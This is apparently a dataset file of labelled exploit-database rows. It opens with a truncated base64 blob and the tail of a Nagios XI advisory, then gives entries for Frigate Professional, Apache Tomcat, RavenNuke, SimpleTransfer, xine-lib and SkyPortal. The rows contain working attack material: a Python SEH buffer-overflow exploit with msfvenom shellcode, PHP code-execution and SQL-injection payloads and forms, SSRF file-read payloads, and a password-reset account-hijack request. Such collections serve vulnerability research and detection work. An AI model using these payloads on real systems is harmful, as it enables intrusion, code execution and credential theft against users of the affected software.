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 vREAAAAA    [POC - PRIVILEGE ESCALATION EXPLOITATION] GET /nagiosxi/includes/components/profile/profile.php?cmd=sudo ./getprofile.sh  The default Profile component archive can be downloaded at the following link: https://assets.nagios.com/downloads/nagiosxi/components/profile.zip  ==Server-Side Request Forgery== Multiple server-side request forgery vulnerabilities exist in the Nagios XI application. An attacker can provide arbitrary data to curl_exec calls to port scan internal services listening on localhost, read files on the Nagios XI server file system or send data to other hosts in the same internal network where the Nagios XI server is deployed.  // the application filter the string 'file://' can be bypassed by converting the handler to uppercase URL         => GET /nagiosxi/ajaxproxy.php?proxyurl=<PAYLOAD> PARAMETER   => proxyurl POC PAYLOAD => FILE:///<path>/<file>  URL         => GET /nagiosxi/backend/?cmd=geturlhtml&url=<PAYLOAD> PARAMETER   => url POC PAYLOAD => file:///<path>/<file>  ==Account Hijacking== The Nagios XI application is vulnerable to an arbitrary account hijacking vulnerability due to an insecure implementation of the password reset functionality. The application does not enforce any verification to confirm the provided reset token can only be used to change the login credentials for the specific user for which it was generated. A limited user can therefore abuse the password reset functionality to hijack an administrative account by tampering with the ‘username’ hidden parameter during the password reset process.  [POC - ACCOUNT HIJACKING 'nagiosadmin'] POST /nagiosxi/login.php?finishresetpass&username=stduser&token-<reset token> HTTP/1.1  token=<reset token>&username=nagiosadmin&password1=<PASSWORD>&password2=<PASSWORD>&reset=1  +----------+ | Solution | +----------+ Upgrade to Nagios XI 5.2.8.  Please note at the time of this writing the privilege escalation vulnerability is still unpatched. The SSRF vulnerabilities have been only partially fixed by blacklisting the 'file://' handler, but all the other SSRF attack vectors are still exploitable. Vendor stated these vulnerabilities will be likely patched on the next release of the application as they require authentication and as such are not considered major security issues.  +------------+ |  Timeline  | +------------+ 13/05/2016 – Initial disclosure to vendor 14/05/2016 – Vendor confirms receipt of advisory 25/05/2016 – Vendor provides fixes for most of the vulnerabilities 25/05/2016 – Enquiry about the status of fixes for the unpatched vulnerabilities 26/05/2016 – Vendor responded with “Since the major issues have been fixed and the remaining issues I'd like to touch up are only available if the user is logged in, or logged in as admin, I don't see a reason to hold onto releasing the advisory.” 2/06/2016 – Public disclosure  +------------+ | Additional | +------------+ Further information is available in the accompanying PDF. http://www.security-assessment.com/files/documents/advisory/NagiosXI-Advisory.pdf",provide arbitrary data to curl_exec calls to port scan internal services,1
48579,"Frigate Professional 3.36.0.9 - 'Find Computer' Local Buffer Overflow (SEH) (PoC) # Exploit Title: Frigate Professional 3.36.0.9 - 'Find Computer' Local Buffer Overflow (SEH) (PoC)  # Vendor Homepage: http://www.frigate3.com/  # Software Link Download: http://www.frigate3.com/download/frigate3_pro.exe # Exploit Author: Paras Bhatia # Discovery Date: 2020-06-04 # Vulnerable Software: Frigate Professional # Version: 3.36.0.9 # Vulnerability Type: Local Buffer Overflow # Tested on: Windows 7 Ultimate Service Pack 1 (32 bit - English)    #Steps to Produce the Crash:  #   1.- Run python code: FrigateLCE.py #   2.- Copy content to clipboard #   3.- Turn off DEP for Frigate3.exe #   4.- Open ""Frigate3.exe"" #   5.- Go to ""Disk"" > Find Computer #   6.- Paste ClipBoard into the ""Computer Name:"" field #   7.- Click on OK #   8.- Calc.exe runs   #################################################################################################################################################  #Python ""FrigateLCE.py"" Code:  f= open(""FrigateLCE.txt"", ""w"")  junk=""A"" * 4112  nseh=""\xeb\x20\x90\x90""  seh=""\x4B\x0C\x01\x40""  #40010C4B   5B               POP EBX #40010C4C   5D               POP EBP #40010C4D   C3               RETN #POP EBX ,POP EBP, RETN | [rtl60.bpl]  (C:\Program Files\Frigate3\rtl60.bpl)  nops=""\x90"" * 50  # msfvenom -a x86 --platform windows -p windows/exec CMD=calc -e x86/alpha_mixed -b ""\x00\x14\x09\x0a\x0d""  -f python  buf =  """" buf += ""\xbf\xe3\xfa\x7b\x97\xdb\xd5\xd9\x74\x24\xf4\x5d\x2b"" buf += ""\xc9\xb1\x30\x83\xed\xfc\x31\x7d\x0f\x03\x7d\xec\x18"" buf += ""\x8e\x6b\x1a\x5e\x71\x94\xda\x3f\xfb\x71\xeb\x7f\x9f"" buf += ""\xf2\x5b\xb0\xeb\x57\x57\x3b\xb9\x43\xec\x49\x16\x63"" buf += ""\x45\xe7\x40\x4a\x56\x54\xb0\xcd\xd4\xa7\xe5\x2d\xe5"" buf += ""\x67\xf8\x2c\x22\x95\xf1\x7d\xfb\xd1\xa4\x91\x88\xac"" buf += ""\x74\x19\xc2\x21\xfd\xfe\x92\x40\x2c\x51\xa9\x1a\xee"" buf += ""\x53\x7e\x17\xa7\x4b\x63\x12\x71\xe7\x57\xe8\x80\x21"" buf += ""\xa6\x11\x2e\x0c\x07\xe0\x2e\x48\xaf\x1b\x45\xa0\xcc"" buf += ""\xa6\x5e\x77\xaf\x7c\xea\x6c\x17\xf6\x4c\x49\xa6\xdb"" buf += ""\x0b\x1a\xa4\x90\x58\x44\xa8\x27\x8c\xfe\xd4\xac\x33"" buf += ""\xd1\x5d\xf6\x17\xf5\x06\xac\x36\xac\xe2\x03\x46\xae"" buf += ""\x4d\xfb\xe2\xa4\x63\xe8\x9e\xe6\xe9\xef\x2d\x9d\x5f"" buf += ""\xef\x2d\x9e\xcf\x98\x1c\x15\x80\xdf\xa0\xfc\xe5\x10"" buf += ""\xeb\x5d\x4f\xb9\xb2\x37\xd2\xa4\x44\xe2\x10\xd1\xc6"" buf += ""\x07\xe8\x26\xd6\x6d\xed\x63\x50\x9d\x9f\xfc\x35\xa1"" buf += ""\x0c\xfc\x1f\xc2\xd3\x6e\xc3\x05""   payload = junk + nseh + seh + nops + buf  f.write(payload) f.close",privilege escalation,1
28254,"Apache Tomcat 5 - Information Disclosure source: https://www.securityfocus.com/bid/19106/info  Apache Tomcat is prone to an information-disclosure vulnerability because it fails to properly sanitize user-supplied input.   An attacker can exploit this issue to reveal a complete directory listing from any directory. Information obtained may aid in further attacks. Reports indicate that this issue may also allow attackers to obtain the source code of script files.  Apache Tomcat 5.028, 5.5.23, 5.5.9, and 5.5.7 are vulnerable to this issue; other versions may also be affected.  Novell GroupWise Mobile Server 1.0 or other versions bundled with Nokia Intellisync Mobile Suite 6.4.31.2, 6.6.0.107, and 6.6.2.2 ship with an affected version of Tomcat and are vulnerable as well.  http://www.example.com/;index.jsp",information-disclosure,1
8068,"ravennuke 2.3.0 - Multiple Vulnerabilities [waraxe-2009-SA#072] - Multiple Vulnerabilities in RavenNuke 2.3.0 ===============================================================================  Author: Janek Vind ""waraxe"" Date: 16. February 2009 Location: Estonia, Tartu Web: http://www.waraxe.us/advisory-72.html   Description of vulnerable software: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  RavenNuke is a web-based automated news publishing and content management system based on PHP and MySQL. The system is fully controlled using a web-based graphical user interface (GUI). RavenNuke is an extensively changed fork of  the phpNuke\portal system.  http://ravenphpscripts.com/   List of found vulnerabilities ===============================================================================  1. Remote Php Code Execution in ""avatarlist.php"" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: High  Reasons:   1. uninitialized arrays ""patterns"" and ""replacements"" Preconditions:   1. attacker must be logged in as user Comments:   1. Exploit is using ""preg_replace"" e-modifier   2. ""register_globals"" setting does not matter   3. Sentinel will not stop this exploit   4. POST method will leave clean logs in most real-world cases  Test using GET method:  http://localhost/ravennuke230/modules.php?name=Your_Account&op=avatarlist &avatarcategory=gallery&patterns[6]=/a/e&replacements[6]=phpinfo()  Test using POST method: ------------------------------------------------------------ <html><body><center> <form action=""http://localhost/ravennuke230/modules.php? name=Your_Account&op=avatarlist"" method=""post""> <input type=""hidden"" name=""avatarcategory"" value=""gallery""> <input type=""hidden"" name=""patterns[6]"" value=""/a/e""> <input type=""hidden"" name=""replacements[6]"" value=""phpinfo()""> <input type=""submit"" value=""Test!""> </form> </center></body></html> ------------------------------------------------------------  Fragment of vulnerable source code: ------------------------------------------------------------ $patterns[0] = '/\.gif/'; $patterns[1] = '/\.png/'; ... $replacements[1] = ''; $replacements[0] = ''; ... $entryname = preg_replace($patterns, $replacements, $entry); ------------------------------------------------------------  Solution: initialize arrays before use.   2. Remote Php Code Execution in ""Your Account"" module ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: medium  Reasons:   1. insecure use of ""eval()"" php function Precoditions:   1. Attacker must have admin rights for ""Your Account"" in   order to change custom fields Comments:   1. This is privilege escalation vulnerability  Test:  1. log in as admin and go to ""Custom Fields"" in users administration:  http://localhost/ravennuke230/admin.php?op=yaCustomFields  2. insert ""_Z;phpinfo()"" (without quotes) into input box ""ID Field Name""  3. click ""Save fields""  4. now go to ""Users"":  http://localhost/ravennuke230/admin.php?op=yaUsers  and select ""User Details"" for any user, click ""OK"". Resulting page will display output of the ""phpinfo()"", done  :)   Fragment of vulnerable source code: ------------------------------------------------------- /* Get Custom Fields and display them in desired order ... $result = $db->sql_query('SELECT * FROM ' . $user_prefix . '_users_fields  WHERE need <> ""0"" AND public=""1"" ORDER BY pos'); ... while ($sqlvalue = $db->sql_fetchrow($result)) {   if (substr($sqlvalue['name'], 0, 1) == '_')  @eval('$name_exit = ' . $sqlvalue['name'] . ';'); -------------------------------------------------------   3. Sql Injection in ""Resend_Email"" module ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: medium  Reasons:   1. Insecure use of ""extract()"" php function Preconditions:   1. attacker must be logged in as admin  Comments:   1. This is privilege escalation vulnerability   2. POST method will leave clean logs in most real-world cases  Test using POST method: ------------------------------------------------------------ <html><body><center> <form action=""http://localhost/ravennuke230/modules.php ?name=Resend_Email"" method=""post""> <input type=""hidden"" name=""user_prefix""  value=""nuke_users_temp WHERE 1=2 UNION SELECT 1,2, CONCAT_WS(0x3a,aid,name,radminsuper,email,pwd),4,5,6,7,8 FROM nuke_authors-- ""> <input type=""submit"" value=""Test!""> </form> </center></body></html> ------------------------------------------------------------  Fragment of vulnerable source code: ------------------------------------------------------------ if (!is_admin($admin)) endit(_ACCESSDENIED); ... extract($HTTP_POST_VARS); ... $result = $db->sql_query('select user_id, username, user_email, user_password, user_regdate, check_num, time, requestor from '.$user_prefix.'_users_temp'); ------------------------------------------------------------  Solution: use EXTR_SKIP to avoid overwriting of existing variables   4. Remote Detection of Local Files in ""captcha.php"" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Security risk: low  Reasons:   1. uninitialized array ""aFonts"" Preconditions:   1. ""register_globals=on""   2. ""display_errors=on"" Comments:   1. multiple page refreshes may needed because of source code specifics   2. same method works for remote directories too!  Attacker is able to detect existance of remote files or directories via different error messages, emitted by php.  Test 1:  http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/waraxe  Result:  Warning: imageftbbox() [function.imageftbbox]: Invalid font filename in C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298  ""Invalid font filename"" --> file does not exist  One more possible error message:  Warning: imageftbbox(): Could not find/open font in ...  ""Could not find/open font"" --> file does not exist   Test 2:  http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/passwd  Result:  Warning: imageftbbox() [function.imageftbbox]: Could not read font in C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298  ""Could not read font"" --> file exists   How to fix: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Upgrade to new version 2.30.01   Disclosure Timeline: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  01/16/09 Developer contacted 01/16/09 Developer's initial response 01/17/09 Fidings sent to developer 02/15/09 Patched version 2.30.01 released by developer 02/16/09 Public disclosure   Greetings: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke, to all active waraxe.us forum members and to anyone else who know me!   Contact: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  come2waraxe@yahoo.com Janek Vind ""waraxe""  Waraxe forum:  http://www.waraxe.us/forums.html Personal homepage: http://www.janekvind.com/  ---------------------- [ EOF ] ------------------------------  # milw0rm.com [2009-02-16]",Code Execution,1
25416,"SimpleTransfer 2.2.1 - Command Injection Title: ====== SimpleTransfer 2.2.1 - Command Injection Vulnerabilities   Date: ===== 2013-05-03   References: =========== http://www.vulnerability-lab.com/get_content.php?id=937   VL-ID: ===== 937   Common Vulnerability Scoring System: ==================================== 5.6   Introduction: ============= Simple Transfer is the easiest way of transferring your Photos and Videos to computer and other iOS devices via WiFi.  No need for cable, iTunes or extra software.  * View all your photo albums and videos on your computer and download them as zip file via WiFi * Send multiple photos and videos from your computer to your device * Transfer any number of photos and videos between iOS devices (iPhone, iPad and iPod Touch),  select an album and tap on ``Select All`` to transfer all your photos/videos * Ability to create new albums and transfer to photos/videos to other albums * Photos are transferred with full resolution including metadata and videos transferred with the highest quality * No limit on the number or size of the photos/videos you transfer between devices or computers * Slideshow photo albums on your computer`s browser * Pay only once to install the app on all your iOS devices (iPhone, iPad and iPod Touch) * Works on Windows, Mac and Linux and it`s fast!  (Copy of the Homepage: https://itunes.apple.com/de/app/simple-transfer/id411292121 )   Abstract: ========= The Vulnerability Laboratory Research Team discovered multiple local command injection vulnerabilities in the mobile Simple-Transfer Photo 2.2.1 iOS app (Apple - iPad|iPhone).   Report-Timeline: ================ 2013-05-03:	Public Disclosure   Status: ======== Published   Affected Products: ================== Apple AppStore Product: SimpleTransfer Photo iOS 2.2.1   Exploitation-Technique: ======================= Local   Severity: ========= High   Details: ======== Multiple local command injection web vulnerabilities are detected  in the mobile SimpleTransfer Photo 2.2.1 iOS app (Apple - iPad|iPhone). The vulnerability allows to inject local commands via vulnerable system values to compromise the apple mobile iOS application.  The first vulnerability is located in the index module when processing to load the unique ipad or iphone device name.  Local attackers can change the ipad or iphone device name to system specific commands and file requests to provoke  the execution when processing to watch the main index photo listing. The execution of the script code occurs in the  header were the device name web context is located when processing to display the device name in the index listing.  The secound vulnerability is located in the index module when processing to load the ipad or iphone photo album folder names.  Local attackers can change the ipad or iphone photo album names to system specific commands and file requests to provoke  the execution when processing to watch the main index album listing. The execution of the script code occurs in the album  folder name web context when processing to display the vulnerable name value listing.  Exploitation of the web vulnerability requires an application user account (standard) and low or medium user interaction. Successful exploitation of the vulnerability results unauthorized execution of system specific commands and file or path requests.   Vulnerable Application(s): 				[+] SimpleTransfer Photo 2.2.1 - ITunes or AppStore (Apple)  Vulnerable Parameter(s): 				[+] Device Name 				[+] Album Folder/Path Name  Affected Module(s): 				[+] Index Listing - Header 				[+] Album Listing - Name   Proof of Concept: ================= 1.1	PoC: Device Name - Index  <html xmlns=""http://www.w3.org/1999/xhtml""><head>         <meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">         <meta http-equiv=""X-UA-Compatible"" content=""IE=7"">         <title>iPad 360 �337%20>""<../[LOCAL COMMAND INJECTION VULNERABILITY]\'></title> 		 		<link href=""index_files/jquery-ui-1.css"" type=""text/css"" rel=""stylesheet""> 		<link href=""index_files/default.css"" rel=""stylesheet"" type=""text/css"" media=""screen""> 		<link href=""index_files/uploadify.css"" rel=""stylesheet"" type=""text/css"" media=""screen""> 		 		<script type=""text/javascript"" src=""index_files/jquery-1.js""></script> 		<script type=""text/javascript"" src=""index_files/jquery-ui-1.js""></script>  		<script type=""text/javascript"" src=""index_files/jquery.js""></script>  		<script type=""text/javascript"">  Local Device Name Command Inject: 	(http://localhost/rambax/)    1.2	PoC:  Album Name - Photo Listing  <div id=""page-title"">Sky Lounge%20>""../[LOCAL COMMAND INJECTION VULNERABILITY]\' src=""D64E64A5-7C0B-4530-B4F5-7406D5BDF168_files/LOACAL.htm"">  <span>(4)</span></div>                     </td>                     <td align=""right"" style=""width: 20%;""> 						<div id=""header-links""> 							<ul> 								<li><a href=""/"" title=""Home"">Back to  Albums</a></li>   Local Album Name Command Inject: 	(http://localhost:8080/rambax/album/D64E64A5-7C0B-4530-B4F5-7406D5BDF168)   Solution: ========= The vulnerabilities can be patched by a secure parse of the album name and device name parameter. Encode the strings and set an own exception-handling to prevent against future command injection attacks.   Risk: ===== The security risk of the local command injection web vulnerabilities are estimated as high(-).   Credits: ======== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@vulnerability-lab.com) [www.vulnerability-lab.com]   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2013 | Vulnerability Laboratory  --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",inject local commands via vulnerable system values to compromise the apple mobile iOS application,1
31002,"Xine-Lib 1.1.9 - 'rmff_dump_cont()' Remote Heap Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/27198/info  The xine-lib library is prone to a remote heap-based buffer-overflow vulnerability. This issue occurs because the software fails to perform adequate boundary checks on user-supplied data.  An attacker can exploit this issue to execute arbitrary code with the privileges of the user running the affected application. Failed exploit attempts will result in a denial-of-service condition.  This issue affects xine-lib 1.1.9 and prior versions.   The following proof-of-concept SDP data is available:  a=Abstract:buffer;'QUFBQUFBQUFBQUFBQUFB...40000_of_QUFBQUFB's...FBQUFB'  When decoding 'QUFBQUFB', the portion will be decoded to 'AAAAAA'.",execute arbitrary code with the privileges of the user running the affected application,1
4638,"skyportal vrc6 - Multiple Vulnerabilities ########################## WwW.BugReport.ir ########################################### # #      BugReport Security Research & Penetration Testing Group # # Title: [Sky Portal] Multiple SQL Injection Vulnerabilities # Vendor: http://skyportal.net # Exploitation: Remote with browser # Fix Available: Patched In Last Version In Vendor ####################################################################################### # Leaders : Shahin Ramezany & Sorush Dalili # Team Members: Alireza Hasani ,Amir Hossein Khonakdar, Hamid Farhadi # Security Site: WwW.BugReport.ir - WwW.AmnPardaz.Com # Country: Iran # Contact : admin@bugreport.ir ######################## Bug Description ###########################  Description: -------------------- A Lot Of Sql Injection Found And We Exploit One Of them A Registered User Can Change His/Her Name And Read All Other's Private Messages.  Vulnerabilities: -------------------- +--> Multiple SQL Injection Vulnerabilities  nc_top.asp Line 59  strDBNTFUserName = Mitoone injection bezane be functione line 60 iani isMbr() >>> test.htm  but !??! this function is very crazy! -------------------------- user can delete all bookmarks inc_bookmarks.asp line 179 delSQL = ""DELETE FROM ""& strTablePrefix & ""BOOKMARKS WHERE BOOKMARK_ID = "" & delBkmk(ib)  this file use from cp_main.asp ---------------------------  inc_profile_functions.asp line 568,570,572,573  ---------------------------  user can delete all SUBSCRIPTIONS> inc_SUBSCRIPTIONS.asp line 163 delSQL = ""DELETE FROM ""& strTablePrefix & ""SUBSCRIPTIONS WHERE SUBSCRIPTION_ID = "" & delBkmk(ib) executeThis(delSQL) this file use from cp_main.asp   -------------------------- Html Exploit ------------------------------  <form action=""http://[VICTIM URL]/cp_main.asp?mode=EditIt&cmd=9"" method=""post""> Photo_URL: <input type=""text"" name=""Photo_URL"" value="""" size=""200""/> <br /> Avatar_URL[injection goes here]: <input type=""text"" name=""Avatar_URL"" value=""',M_Name='Admin',M_Username='Admin"" /> <br /> LINK1[Also injection goes here]: <input type=""text"" name=""LINK1"" value="""" /> <br /> LINK2[Also injection goes here]: <input type=""text"" name=""LINK2"" value="""" /> <br /> Password: <input type=""text"" name=""Password-d"" value=""YOU MUST ENTER YOUR HASHED PASSWORD HERE (For Ex: 123123 = defbfbd84d16387273dde914fd309c3b)"" /> <br /> Email: <input type=""text"" name=""Email"" value=""admin@bugreport.ir"" /> <br /> Name: <input type=""text"" name=""Name"" value=""Your Current Username"" /> <br /> RECMAIL: <input type=""text"" name=""RECMAIL"" value=""0"" /> <br /> HideMail: <input type=""text"" name=""HideMail"" value=""1"" /> <br /> <br /> <input type=""submit"" /> </form>  Credit: -------------------- BugReport Security Research & Penetration Testing Group WwW.BugReport.ir  # milw0rm.com [2007-11-20]",code execution,1
